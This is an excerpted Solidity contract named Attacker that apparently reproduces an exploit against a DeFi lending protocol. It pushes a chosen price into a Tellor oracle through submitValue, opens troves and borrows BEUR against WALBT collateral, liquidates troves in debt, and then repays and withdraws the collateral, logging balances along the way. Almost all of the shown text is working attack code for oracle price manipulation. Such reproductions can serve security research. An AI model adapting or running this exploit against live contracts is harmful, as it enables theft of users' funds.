...
contract Attacker {
    ...
    function _submitValue(uint256 value) internal {
        ...
        (bool success,) = _delegatooor.call(abi.encodeWithSignature("updatePrice(uint256)", value));
    ...
    function _createFirstTroveAndBorrow() internal {
        ...
        console.log("Balance BEUR after borrow (no decimals): %s", IERC20(BEUR).balanceOf(address(this)) / 1e18);
    }

    function _createSecondTrove() internal {
        secondTrove = IOriginalTroveFactory(TROVE_FACTORY).createTrove(WALBT);

        uint256 someAmount = 13 ether;
        IERC20(WALBT).transfer(address(secondTrove), someAmount);
        secondTrove.increaseCollateral(0, address(0));

        console.log("Balance WALBT after second trove creation: %s", IERC20(WALBT).balanceOf(address(this)));
    }
    ...
    function _liquidateTrovesInDebt() internal {
        ...
        for (uint256 i; i < troves.length; i++) {
            // no sufficient BEUR to pay for last troves
            trove = ITrove(troves[i]);
            uint256 debt = trove.debt();
            console.log("Trove %s , debt: %s", i, debt);
    ...
    function _buyCollateral() internal {
        IERC20(BEUR).approve(address(secondTrove), type(uint256).max);
        secondTrove.repay(type(uint256).max, address(0));
        secondTrove.decreaseCollateral(address(this), IERC20(WALBT).balanceOf(address(secondTrove)), address(0));

        console.log("Balance WALBT end (no decimals): %s", IERC20(WALBT).balanceOf(address(this)) / 1e18);
    }
    ...
    function updatePrice(uint256 _value) external {
         ...
         */
        tellorFlex.submitValue(queryId, value, 0, queryData);
